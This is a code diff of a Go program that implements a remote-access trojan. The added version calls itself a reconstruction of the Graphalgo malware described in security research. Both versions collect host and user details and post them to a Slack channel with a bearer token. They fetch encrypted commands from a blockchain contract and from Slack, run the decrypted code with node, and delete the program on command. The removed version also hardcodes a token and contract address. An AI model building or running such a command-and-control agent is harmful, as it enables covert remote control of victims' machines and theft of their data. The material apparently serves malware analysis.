@@ -1,89 +1,100 @@
 package main
 
-// Graphalgo-style second-stage RAT: profiles the host, checks the result in
-// to a Slack channel, then polls an Ethereum contract for encrypted commands
-// and executes the decrypted body with node (or self-deletes on command).
+// Behavioral reconstruction of the Graphalgo agent described by Aikido,
+// linked from the ReversingLabs article. Not original recovered malware.
 import (
-	"bytes"
-	"encoding/json"
-	"fmt"
-	"net/http"
-	"os"
-	"os/exec"
-	"os/user"
-	"runtime"
-	"time"
+    "bytes"
+    "crypto/aes"
+    "crypto/cipher"
+    "encoding/base64"
+    "encoding/hex"
+    "encoding/json"
+    "fmt"
+    "net/http"
+    "os"
+    "os/exec"
+    "os/user"
+    "runtime"
+    "time"
 )
 
-const slackToken = "xoxb-123456789012-123456789012-AbCdEfGhIjKlMnOpQrStUv"
-const contract = "0xAD02b5cDE693529d3bdA0266299501ad0193036C"
-
-func checkin() {
-	node, err := exec.LookPath("node")
-	if err != nil {
-		node = ""
-	}
-	host, _ := os.Hostname()
-	u, _ := user.Current()
-	report := fmt.Sprintf(
-		"*System Report*\n- Platform : `%s`\n- Arch     : `%s`\n- Hostname : `%s`\n- Username : `%s`\n- Home Dir : `%s`\n- Node \t: `%s`\n- Time \t: `%s`\n",
-		runtime.GOOS, runtime.GOARCH, host, u.Username, u.HomeDir, node,
-		time.Now().UTC().Format(time.RFC3339),
-	)
-	body, _ := json.Marshal(map[string]string{
-		"channel": "frontend-devs",
-		"text":    report,
-	})
-	req, _ := http.NewRequest("POST", "https://slack.com/api/chat.postMessage", bytes.NewReader(body))
-	req.Header.Set("Authorization", "Bearer "+slackToken)
-	http.DefaultClient.Do(req)
+func checkin(token string) {
+    node, _ := exec.LookPath("node")
+    host, _ := os.Hostname()
+    u, _ := user.Current()
+    data, _ := json.Marshal(map[string]string{
+        "channel": "frontend-devs",
+        "text": fmt.Sprintf("%s %s %s %s %s %s", runtime.GOOS, runtime.GOARCH, host, u.Username, u.HomeDir, node),
+    })
+    req, _ := http.NewRequest("POST", "https://slack.com/api/chat.postMessage", bytes.NewReader(data))
+    req.Header.Set("Authorization", "Bearer "+token)
+    resp, err := http.DefaultClient.Do(req)
+    if err == nil { resp.Body.Close() }
 }
 
-const sepoliaRPC = "https://sepolia-rollup.arbitrum.io/rpc"
+func blockchain(key []byte, rpc string) {
+    block, _ := aes.NewCipher(key)
+    gcm, _ := cipher.NewGCM(block)
+    for {
+        // Read serviceData1() using its ABI selector, supplied by the caller.
+        call, _ := json.Marshal(map[string]any{
+            "jsonrpc": "2.0", "id": 1, "method": "eth_call",
+            "params": []any{map[string]string{
+                "to": "0xAD02b5cDE693529d3bdA0266299501ad0193036C",
+                "data": os.Getenv("TASK_SELECTOR"),
+            }, "latest"},
+        })
+        resp, err := http.Post(rpc, "application/json", bytes.NewReader(call))
+        if err != nil { time.Sleep(3*time.Second); continue }
+        var reply struct { Result string `json:"result"` }
+        json.NewDecoder(resp.Body).Decode(&reply)
+        resp.Body.Close()
+        // A reconstruction uses a nonce-prefixed encrypted byte result;
+        // the article does not publish the ABI framing or cipher mode.
+        blob, _ := hex.DecodeString(reply.Result)
+        if len(blob) < gcm.NonceSize() { continue }
+        plain, err := gcm.Open(nil, blob[:gcm.NonceSize()], blob[gcm.NonceSize():], nil)
+        if err == nil {
+            command := exec.Command("node", "-e", string(plain))
+            command.Start()
+        }
+        time.Sleep(3*time.Second)
+    }
+}
 
-// The operator multiplexes tasking across contract methods: serviceData1
-// and serviceData2 carry encrypted commands while setCPubKey rotates keys.
-var taskMethods = []string{"serviceData1", "serviceData2", "setCPubKey"}
-
-func pollContract() []byte {
-	for _, method := range taskMethods {
-		call, _ := json.Marshal(map[string]any{
-			"method": "eth_call",
-			"params": []any{
-				map[string]string{"to": contract, "data": method},
-				"latest",
-			},
-		})
-		resp, err := http.Post(sepoliaRPC, "application/json", bytes.NewReader(call))
-		if err != nil {
-			continue
-		}
-		var out struct {
-			Result string `json:"result"`
-		}
-		json.NewDecoder(resp.Body).Decode(&out)
-		resp.Body.Close()
-		if out.Result != "" {
-			return []byte(out.Result)
-		}
-	}
-	return nil
+func slack(key []byte, token, channel string) {
+    block, _ := aes.NewCipher(key)
+    gcm, _ := cipher.NewGCM(block)
+    for {
+        req, _ := http.NewRequest("GET", "https://slack.com/api/conversations.history?channel="+channel, nil)
+        req.Header.Set("Authorization", "Bearer "+token)
+        resp, err := http.DefaultClient.Do(req)
+        if err != nil { time.Sleep(10*time.Second); continue }
+        var reply struct { Messages []struct { Text string `json:"text"` } `json:"messages"` }
+        json.NewDecoder(resp.Body).Decode(&reply)
+        resp.Body.Close()
+        for _, message := range reply.Messages {
+            blob, _ := base64.StdEncoding.DecodeString(message.Text)
+            if len(blob) < gcm.NonceSize() { continue }
+            plain, err := gcm.Open(nil, blob[:gcm.NonceSize()], blob[gcm.NonceSize():], nil)
+            if err != nil { continue }
+            if bytes.HasPrefix(plain, []byte("delete")) {
+                self, _ := os.Executable()
+                os.Remove(self)
+                return
+            }
+            command := exec.Command("node", "-e", string(plain))
+            command.Start()
+        }
+        time.Sleep(10*time.Second)
+    }
 }
 
 func main() {
-	checkin()
-	for {
-		raw := pollContract()
-		if len(raw) == 0 {
-			time.Sleep(3 * time.Second)
-			continue
-		}
-		if len(raw) >= 6 && string(raw[:6]) == "delete" {
-			os.Remove(os.Args[0])
-			return
-		}
-		cmd := exec.Command("node", "-e", string(raw))
-		cmd.Start()
-		time.Sleep(10 * time.Second)
-	}
+    // Keys and credentials supplied out of band; no live credentials included.
+    if len(os.Args) != 5 { return }
+    key, err := hex.DecodeString(os.Args[1]); if err != nil || len(key) != 32 { return }
+    checkin(os.Args[2])
+    go blockchain(key, os.Args[4])
+    slack(key, os.Args[2], os.Args[3])
 }
